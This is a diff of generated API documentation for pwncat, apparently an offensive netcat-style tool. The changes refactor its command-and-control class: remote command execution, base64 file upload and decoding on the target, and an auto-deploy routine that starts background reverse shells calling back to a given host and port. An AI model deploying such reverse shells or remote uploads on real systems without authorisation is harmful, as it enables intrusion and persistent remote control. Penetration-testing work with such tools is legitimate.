+                    self.remote_command(&#39;echo &#34;{}&#34; &gt; {}&#39;.format(b64, rpath), False)
                     first = False
                 else:
-                    self.remote_command(&#39;echo &#34;{}&#34; &gt;&gt; {}&#39;.format(b64, rpath))
+                    self.remote_command(&#39;echo &#34;{}&#34; &gt;&gt; {}&#39;.format(b64, rpath), False)
                 curr += 1
+        self.flush_receive()
         self.print_info()
         # TODO: md5 check if this is legit
         return True
@@ -7678,17 +8029,20 @@ def type_tos(value):
             bool: Returns `True` on success or `False` on failure.
         &#34;&#34;&#34;
         command = []
-        command.append(&#34;{} -c &#39;import base64;&#34;.format(self.__python))
+        command.append(&#34;{} -c &#39;import base64;&#34;.format(self.__remote_python))
         command.append(&#39;f=open(&#34;{}&#34;, &#34;r&#34;);&#39;.format(rpath_source))
         command.append(&#34;lines = f.readlines();&#34;)
-        if self.__py3:
-            command.append(&#39;print(&#34;&#34;.join([base64.b64decode(l.encode()) for l in lines]));\&#39;&#39;)
+        if self.__remote_py3:
+            command.append(
+                &#39;print((b&#34;&#34;.join([base64.b64decode(l.encode()) for l in lines])).decode());\&#39;&#39;
+            )
         else:
             command.append(&#39;print &#34;&#34;.join([base64.b64decode(l) for l in lines]);\&#39;&#39;)
         command.append(&#34;&gt; {}&#34;.format(rpath_target))
 
         self.print_info(&#34;Decoding: {} -&gt; {}&#34;.format(rpath_source, rpath_target))
-        self.remote_command(&#34;&#34;.join(command))
+        self.remote_command(&#34;&#34;.join(command), False)
+        self.flush_receive()
         # TODO: validate via md5
         return True</code></pre>
 </details>
@@ -7698,7 +8052,7 @@ def type_tos(value):
 </ul>
 <h3>Instance variables</h3>
 <dl>
-<dt id="pwncat.CNC.py3"><code class="name">var <span class="ident">py3</span></code></dt>
+<dt id="pwncat.CNC.remote_py3"><code class="name">var <span class="ident">remote_py3</span></code></dt>
 <dd>
 <div class="desc"><p>Is remote version Python3? Else it is Python2.</p></div>
 <details class="source">
@@ -7706,13 +8060,13 @@ def type_tos(value):
 <span>Expand source code</span>
 </summary>
 <pre><code class="python">@property
-def py3(self):
+def remote_py3(self):
     # type: () -&gt; bool
     &#34;&#34;&#34;Is remote version Python3? Else it is Python2.&#34;&#34;&#34;
-    return self.__py3</code></pre>
+    return self.__remote_py3</code></pre>
 </details>
 </dd>
-<dt id="pwncat.CNC.python"><code class="name">var <span class="ident">python</span></code></dt>
+<dt id="pwncat.CNC.remote_python"><code class="name">var <span class="ident">remote_python</span></code></dt>
 <dd>
 <div class="desc"><p>Discovered absolute Python remote path.</p></div>
 <details class="source">
@@ -7720,10 +8074,10 @@ def py3(self):
 <span>Expand source code</span>
 </summary>
 <pre><code class="python">@property
-def python(self):
+def remote_python(self):
     # type: () -&gt; str
     &#34;&#34;&#34;Discovered absolute Python remote path.&#34;&#34;&#34;
-    return self.__python</code></pre>
+    return self.__remote_python</code></pre>
 </details>
 </dd>
 </dl>
@@ -7751,7 +8105,7 @@ def python(self):
         str or None: Returns path on success or None on error.
     &#34;&#34;&#34;
     command = []
-    command.append(&#34;{} -c &#39;&#34;.format(self.__python))
+    command.append(&#34;{} -c &#39;&#34;.format(self.__remote_python))
     command.append(&#34;import tempfile;&#34;)
     command.append(&#34;h,f=tempfile.mkstemp();&#34;)
     if self.__py3:
@@ -7759,17 +8113,49 @@ def python(self):
     else:
         command.append(&#34;print f;&#34;)
     command.append(&#34;&#39;&#34;)
-    self.remote_command(&#34;&#34;.join(command))
 
     self.print_info(&#34;Creating tmpfile:&#34;, False, True)
-    for response in self.__frecv():
-        if response:
-            tmpfile = StringEncoder.decode(response).rstrip()
-            self.print_info(&#34;Creating tmpfile: {}&#34;.format(tmpfile), True, True)
-            return tmpfile
+    response = self.remote_command(&#34;&#34;.join(command), True)
+
+    if response is not None and len(response) == 1:
+        tmpfile = StringEncoder.decode(response[0]).rstrip()
+        self.print_info(&#34;Creating tmpfile: {}&#34;.format(tmpfile), True, True)
+        return tmpfile
 
     self.print_info(&#34;Failed to create tmpfile&#34;, True, True)
     return None</code></pre>
+</details>
+</dd>
+<dt id="pwncat.CNC.flush_receive"><code class="name flex">
+<span>def <span class="ident">flush_receive</span></span>(<span>self)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Try to reveive everything which is currently being sent from remote.</p>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>List[bytes]</code></dt>
+<dd>Returns a list of bytes of received data.</dd>
+</dl>
+<h2 id="raises">Raises</h2>
+<dl>
+<dt><code>socket.error</code></dt>
+<dd>Except here when unconnected or connection was forcibly closed.</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def flush_receive(self):
+    # type: () -&gt; List[bytes]
+    &#34;&#34;&#34;Try to reveive everything which is currently being sent from remote.
+
+    Returns:
+        List[bytes]: Returns a list of bytes of received data.
+
+    Raises:
+        socket.error:   Except here when unconnected or connection was forcibly closed.
+    &#34;&#34;&#34;
+    return self.send_recv(None, False)</code></pre>
 </details>
 </dd>
 <dt id="pwncat.CNC.print_info"><code class="name flex">
@@ -7813,30 +8199,205 @@ def python(self):
         sys.stdout.flush()</code></pre>
 </details>
 </dd>
-<dt id="pwncat.CNC.remote_command"><code class="name flex">
-<span>def <span class="ident">remote_command</span></span>(<span>self, command)</span>
+<dt id="pwncat.CNC.print_raw"><code class="name flex">
+<span>def <span class="ident">print_raw</span></span>(<span>self, message)</span>
 </code></dt>
 <dd>
-<div class="desc"><p>Run remote command with correct linefeeds.</p>
+<div class="desc"><p>Print a message to the local screen without color/prefix.</p>
 <h2 id="args">Args</h2>
 <dl>
-<dt><strong><code>command</code></strong> :&ensp;<code>str</code></dt>
-<dd>The command to execute on the remote end.</dd>
+<dt><strong><code>message</code></strong> :&ensp;<code>bytes</code></dt>
+<dd>The message to print.</dd>
 </dl></div>
 <details class="source">
 <summary>
 <span>Expand source code</span>
 </summary>
-<pre><code class="python">def remote_command(self, command):
-    # type: (str) -&gt; None
-    &#34;&#34;&#34;Run remote command with correct linefeeds.
+<pre><code class="python">def print_raw(self, message):
+    # type: (bytes) -&gt; None
+    &#34;&#34;&#34;Print a message to the local screen without color/prefix.
+
+    Args:
+        message (bytes): The message to print.
+    &#34;&#34;&#34;
+    if self.__py3:
+        sys.stdout.buffer.write(message)
+    else:
+        # For issues with flush (when using tail -F or equal) see links below:
+        # https://stackoverflow.com/questions/26692284
+        # https://docs.python.org/3/library/signal.html#note-on-sigpipe
+        print(message, end=&#34;&#34;)
+
+    try:
+        sys.stdout.flush()
+    except IOError:
+        # Python flushes standard streams on exit; redirect remaining output
+        # to devnull to avoid another broken pipe at shutdown
+        devnull = os.open(os.devnull, os.O_WRONLY)
+        os.dup2(devnull, sys.stdout.fileno())</code></pre>
+</details>
+</dd>
+<dt id="pwncat.CNC.remote_command"><code class="name flex">
+<span>def <span class="ident">remote_command</span></span>(<span>self, command, output)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Run remote command with correct linefeeds and receive response lines.</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>command</code></strong> :&ensp;<code>str</code></dt>
+<dd>The command to execute on the remote end.</dd>
+<dt><strong><code>output</code></strong> :&ensp;<code>bool</code></dt>
+<dd>Receive output from command?</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def remote_command(self, command, output):
+    # type: (str, bool) -&gt; Optional[List[bytes]]
+    &#34;&#34;&#34;Run remote command with correct linefeeds and receive response lines.
 
     Args:
         command (str): The command to execute on the remote end.
+        output (bool): Receive output from command?
     &#34;&#34;&#34;
     # TODO: determine remote host line feeds and set accordingly.
     # TODO: handle exception
-    self.__fsend(StringEncoder.encode(command + &#34;\n&#34;))</code></pre>
+    command = command.rstrip(&#34;\r\n&#34;)
+    command = command.rstrip(&#34;\r&#34;)
+    command = command.rstrip(&#34;\n&#34;)
+    command = command + &#34;\n&#34;
+    if output:
+        return self.send_recv(StringEncoder.encode(command))
+    self.send(StringEncoder.encode(command))
+    return None</code></pre>
+</details>
+</dd>
+<dt id="pwncat.CNC.send"><code class="name flex">
+<span>def <span class="ident">send</span></span>(<span>self, data)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Send data through a connected (TCP) or unconnected (UDP) socket.</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>data</code></strong> :&ensp;<code>bytes</code></dt>
+<dd>The data to send.</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>int</code></dt>
+<dd>Returns total bytes sent.</dd>
+</dl>
+<h2 id="raises">Raises</h2>
+<dl>
+<dt><code>socket.error</code></dt>
+<dd>Except here when unconnected or connection was forcibly closed.</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def send(self, data):
+    # type: (bytes) -&gt; int
+    &#34;&#34;&#34;Send data through a connected (TCP) or unconnected (UDP) socket.
+
+    Args:
+        data (bytes): The data to send.
+
+    Returns:
+        int: Returns total bytes sent.
+
+    Raises:
+        socket.error:   Except here when unconnected or connection was forcibly closed.
+    &#34;&#34;&#34;
+    return self.__net.net.send(data)</code></pre>
+</details>
+</dd>
+<dt id="pwncat.CNC.send_recv"><code class="name flex">
+<span>def <span class="ident">send_recv</span></span>(<span>self, data, strip_prefix=True)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Send data through a connected (TCP) or unconnected (UDP) socket and receive all replies.</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt>data (None|bytes): The data to send. If None, will skip sending.</dt>
+<dt><strong><code>strip_prefix</code></strong> :&ensp;<code>bool</code></dt>
+<dd>Strip remote prefix from received data?</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>List[bytes]</code></dt>
+<dd>Returns a list of bytes of received data.</dd>
+</dl>
+<h2 id="raises">Raises</h2>
+<dl>
+<dt><code>socket.error</code></dt>
+<dd>Except here when unconnected or connection was forcibly closed.</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def send_recv(self, data, strip_prefix=True):
+    # type: (Optional[bytes], bool) -&gt; List[bytes]
+    &#34;&#34;&#34;Send data through a connected (TCP) or unconnected (UDP) socket and receive all replies.
+
+    Args:
+        data (None|bytes): The data to send. If None, will skip sending.
+        strip_prefix (bool): Strip remote prefix from received data?
+
+    Returns:
+        List[bytes]: Returns a list of bytes of received data.
+
+    Raises:
+        socket.error:   Except here when unconnected or connection was forcibly closed.
+    &#34;&#34;&#34;
+    # [1/3] Send
+    if data is not None:
+        self.__net.net.send(data)
+
+    # [2/3] Receive actual reply
+    responses = []
+    curr_retry = 0
+
+    while curr_retry &lt; self.__recv_retries:
+        try:
+            response = self.__net.net.receive()
+        except socket.timeout:
+            curr_retry += 1
+            time.sleep(self.__recv_timeout)
+        # On successful read, we can determine to adjust timings.
+        else:
+            if response:
+                responses.append(response)
+
+                # If retries were necessary, we will increase the time-out.
+                if curr_retry &gt; 0:
+                    self.__recv_timeout += self.__recv_timeout / 2
+
+                # If ne retries were necessary, we can descrease the timeout a bit
+                if curr_retry == 0:
+                    self.__recv_timeout -= self.__recv_timeout / 2
+
+                # Reset the retry counter for next line to read
+                curr_retry = 0
+
+    # [3/3] Remove remote ends prefix (if it sends something like it)
+    # We iterate reversed of responses and check if the new line prefix(es)
+    # are present at the end.
+    # This is because the prefix(es) is always received last.
+    if self.__remote_prefix and strip_prefix:
+        for idx, item in enumerate(self.__remote_prefix):
+            rev_idx = (idx + 1) * -1
+            # Remove prefix part from right (and strip whitesspace)
+            responses[rev_idx] = responses[rev_idx].rstrip(self.__remote_prefix[rev_idx])
+            responses[rev_idx] = responses[rev_idx].rstrip()
+
+            # Ensure empty elements are removed
+            responses = [item for item in responses if item]
+
+    # Return list of respones
+    return responses</code></pre>
 </details>
 </dd>
 <dt id="pwncat.CNC.upload"><code class="name flex">
@@ -7871,7 +8432,7 @@ def python(self):
     Returns:
         bool: Returns `True` on success and `False` on failure.
     &#34;&#34;&#34;
-    assert self.__python is not None
+    assert self.__remote_python is not None
     assert self.__py3 is not None
 
     rpath_b64 = self.create_remote_tmpfile()
@@ -7888,19 +8449,15 @@ def python(self):
 </dd>
 <dt id="pwncat.CNCAutoDeploy"><code class="flex name class">
 <span>class <span class="ident">CNCAutoDeploy</span></span>
-<span>(</span><span>enc, send, recv, cmd, host, ports)</span>
+<span>(</span><span>network, cmd, host, ports)</span>
 </code></dt>
 <dd>
 <div class="desc"><p>Command&amp;Control pwncat auto deployment class.</p>
 <p>Instantiate Command and Control class.</p>
 <h2 id="args">Args</h2>
 <dl>
-<dt><strong><code>enc</code></strong> :&ensp;<code><a title="pwncat.StringEncoder" href="#pwncat.StringEncoder">StringEncoder</a></code></dt>
-<dd>Instance of StringEncoder (Python2/3 str/byte compat).</dd>
-<dt><strong><code>fsend</code></strong> :&ensp;<code>func</code></dt>
-<dd>Socket send function.</dd>
-<dt><strong><code>frcev</code></strong> :&ensp;<code>func</code></dt>
-<dd>Socket receive generator function.</dd>
+<dt><strong><code>network</code></strong> :&ensp;<code><a title="pwncat.IONetwork" href="#pwncat.IONetwork">IONetwork</a></code></dt>
+<dd>Instance of IONetwork</dd>
 </dl>
 <h2 id="raises">Raises</h2>
 <dl>
@@ -7916,16 +8473,14 @@ def python(self):
 
     def __init__(
         self,
-        enc,  # type: StringEncoder
-        send,  # type: Callable[[bytes], None]
-        recv,  # type: Callable[[], Iterator[bytes]]
+        network,  # type: IONetwork
         cmd,  # type: str
         host,  # type: str
         ports,  # type: List[int]
     ):
         # type: (...) -&gt; None
         try:
-            super(CNCAutoDeploy, self).__init__(enc, send, recv)
+            super(CNCAutoDeploy, self).__init__(network)
         except FileNotFoundError:
             return
 
@@ -7944,7 +8499,7 @@ def python(self):
         for port in ports:
             command = []
             command.append(&#34;nohup&#34;)
-            command.append(self.python)
+            command.append(self.remote_python)
             command.append(remote_path)
             command.append(host)
             command.append(str(port))
@@ -7954,7 +8509,7 @@ def python(self):
             command.append(&#34;&amp;&#34;)
             data = &#34; &#34;.join(command)
             print(&#34;Starting pwncat rev shell: {}&#34;.format(data))
-            self.remote_command(data)</code></pre>
+            self.remote_command(data, False)</code></pre>
 </details>
 <h3>Ancestors</h3>
 <ul class="hlist">
@@ -7965,10 +8520,14 @@ def python(self):
 <li><code><b><a title="pwncat.CNC" href="#pwncat.CNC">CNC</a></b></code>:
 <ul class="hlist">
 <li><code><a title="pwncat.CNC.create_remote_tmpfile" href="#pwncat.CNC.create_remote_tmpfile">create_remote_tmpfile</a></code></li>
+<li><code><a title="pwncat.CNC.flush_receive" href="#pwncat.CNC.flush_receive">flush_receive</a></code></li>
 <li><code><a title="pwncat.CNC.print_info" href="#pwncat.CNC.print_info">print_info</a></code></li>
-<li><code><a title="pwncat.CNC.py3" href="#pwncat.CNC.py3">py3</a></code></li>
-<li><code><a title="pwncat.CNC.python" href="#pwncat.CNC.python">python</a></code></li>
+<li><code><a title="pwncat.CNC.print_raw" href="#pwncat.CNC.print_raw">print_raw</a></code></li>
 <li><code><a title="pwncat.CNC.remote_command" href="#pwncat.CNC.remote_command">remote_command</a></code></li>
+<li><code><a title="pwncat.CNC.remote_py3" href="#pwncat.CNC.remote_py3">remote_py3</a></code></li>
+<li><code><a title="pwncat.CNC.remote_python" href="#pwncat.CNC.remote_python">remote_python</a></code></li>
+<li><code><a title="pwncat.CNC.send" href="#pwncat.CNC.send">send</a></code></li>
+<li><code><a title="pwncat.CNC.send_recv" href="#pwncat.CNC.send_recv">send_recv</a></code></li>
 <li><code><a title="pwncat.CNC.upload" href="#pwncat.CNC.upload">upload</a></code></li>
 </ul>
 </li>
@@ -10154,6 +10713,12 @@ def producer(self, *args, **kwargs):
 <pre><code class="python">class IONetwork(IO):
     &#34;&#34;&#34;Pwncat implementation based on custom Socket library.&#34;&#34;&#34;
 
+    @property
+    def net(self):
+        # type: () -&gt; Net
+        &#34;&#34;&#34;Returns instance of Net.&#34;&#34;&#34;
+        return self.__net
+
     # --------------------------------------------------------------------------
     # Constructor / Destructor
     # --------------------------------------------------------------------------
@@ -10463,6 +11028,23 @@ def producer(self, *args, **kwargs):
 <li><a title="pwncat.IO" href="#pwncat.IO">IO</a></li>
 <li>abc.ABC</li>
 </ul>
+<h3>Instance variables</h3>
+<dl>
+<dt id="pwncat.IONetwork.net"><code class="name">var <span class="ident">net</span></code></dt>
+<dd>
+<div class="desc"><p>Returns instance of Net.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@property
+def net(self):
+    # type: () -&gt; Net
+    &#34;&#34;&#34;Returns instance of Net.&#34;&#34;&#34;
+    return self.__net</code></pre>
+</details>
+</dd>
+</dl>
 <h3>Methods</h3>
 <dl>
 <dt id="pwncat.IONetwork.consumer"><code class="name flex">
@@ -14553,7 +15135,7 @@ def store(self):
             # (SHUT_RDWR) 2 = Both
             self.__log.trace(&#34;Shutting down %s socket&#34;, name)  # type: ignore
             sock.shutdown(socket.SHUT_RDWR)
-        except (OSError, socket.error) as error:
+        except (OSError, socket.error):
             # We do not log errors here, as unconnected sockets cannot
             # be shutdown and we want to throw any socket at this function.
             pass
@@ -14833,7 +15415,7 @@ def is_ipv6_address(host):
         # (SHUT_RDWR) 2 = Both
         self.__log.trace(&#34;Shutting down %s socket&#34;, name)  # type: ignore
         sock.shutdown(socket.SHUT_RDWR)
-    except (OSError, socket.error) as error:
+    except (OSError, socket.error):
         # We do not log errors here, as unconnected sockets cannot
         # be shutdown and we want to throw any socket at this function.
         pass
@@ -16375,10 +16957,14 @@ def transform(self, data):
 <h4><code><a title="pwncat.CNC" href="#pwncat.CNC">CNC</a></code></h4>
 <ul class="">
 <li><code><a title="pwncat.CNC.create_remote_tmpfile" href="#pwncat.CNC.create_remote_tmpfile">create_remote_tmpfile</a></code></li>
+<li><code><a title="pwncat.CNC.flush_receive" href="#pwncat.CNC.flush_receive">flush_receive</a></code></li>
 <li><code><a title="pwncat.CNC.print_info" href="#pwncat.CNC.print_info">print_info</a></code></li>
-<li><code><a title="pwncat.CNC.py3" href="#pwncat.CNC.py3">py3</a></code></li>
-<li><code><a title="pwncat.CNC.python" href="#pwncat.CNC.python">python</a></code></li>
+<li><code><a title="pwncat.CNC.print_raw" href="#pwncat.CNC.print_raw">print_raw</a></code></li>
 <li><code><a title="pwncat.CNC.remote_command" href="#pwncat.CNC.remote_command">remote_command</a></code></li>
+<li><code><a title="pwncat.CNC.remote_py3" href="#pwncat.CNC.remote_py3">remote_py3</a></code></li>
+<li><code><a title="pwncat.CNC.remote_python" href="#pwncat.CNC.remote_python">remote_python</a></code></li>
+<li><code><a title="pwncat.CNC.send" href="#pwncat.CNC.send">send</a></code></li>
+<li><code><a title="pwncat.CNC.send_recv" href="#pwncat.CNC.send_recv">send_recv</a></code></li>
 <li><code><a title="pwncat.CNC.upload" href="#pwncat.CNC.upload">upload</a></code></li>
 </ul>
 </li>
@@ -16527,6 +17113,7 @@ def transform(self, data):
 <ul class="">
 <li><code><a title="pwncat.IONetwork.consumer" href="#pwncat.IONetwork.consumer">consumer</a></code></li>
 <li><code><a title="pwncat.IONetwork.interrupt" href="#pwncat.IONetwork.interrupt">interrupt</a></code></li>
+<li><code><a title="pwncat.IONetwork.net" href="#pwncat.IONetwork.net">net</a></code></li>
 <li><code><a title="pwncat.IONetwork.producer" href="#pwncat.IONetwork.producer">producer</a></code></li>
 </ul>
 </li>
